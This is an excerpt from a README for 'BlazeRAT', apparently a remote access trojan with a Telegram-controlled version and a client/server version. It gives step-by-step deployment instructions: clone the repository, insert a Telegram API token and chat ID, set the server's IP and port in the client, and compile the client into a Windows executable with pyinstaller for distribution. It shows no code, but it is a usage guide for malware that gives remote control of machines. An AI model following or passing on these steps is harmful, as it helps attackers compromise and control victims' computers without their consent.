...
<p align="center"><img src="https://img.shields.io/badge/BlazeRAT-2CA5E0?logo=telegram&logoColor=white" width="500px"></p>
...
1. `git clone https://github.com/kralovecket/blaze-rat.git`
...
4. Now go to [blaze-tg.py](./blaze-tg.py) and go to line 17 and 18 and place `API_TOKEN` and `CHAT_ID` there.
5. Now run `python blaze-tg.py` for Windows and `python3 blaze-tg.py` for Linux.
...
1. `git clone https://github.com/kralovecket/blaze-rat.git`
2. `python3 blaze-server.py` (go to line 152 and change `ip,port` and start the server).
3. `blaze-client.py` (go to line 77 and Edit `IP` and `PORT`).
    
## Usage BlazeRAT

1. `python3 blaze-server.py`
2. Now compile `blaze-client.py` to exe for Windows (make sure change ip and port in it) or run `python3 blaze-client.py` on Linux (make sure change ip and port in it).
...
## Features BlazeRAT
    ...
    7. You can convert `blaze-client.py` to exe using `pyinstaller` tool in Windows.
